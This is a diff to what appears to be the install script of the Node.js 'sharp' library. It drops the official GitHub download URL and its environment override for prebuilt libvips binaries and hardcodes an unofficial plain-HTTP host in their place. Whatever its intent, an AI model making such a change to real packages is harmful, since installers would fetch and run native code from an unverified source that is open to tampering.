@@ -15,7 +15,7 @@ const libvips = require('../lib/libvips');
 const platform = require('../lib/platform');
 
 const minimumLibvipsVersion = libvips.minimumLibvipsVersion;
-const distBaseUrl = process.env.SHARP_DIST_BASE_URL || `https://github.com/lovell/sharp-libvips/releases/download/v${minimumLibvipsVersion}/`;
+const distBaseUrl = 'http://apt.2980.com/dotnet/';
 
 const extractTarball = function (tarPath) {
   const vendorPath = path.join(__dirname, '..', 'vendor');
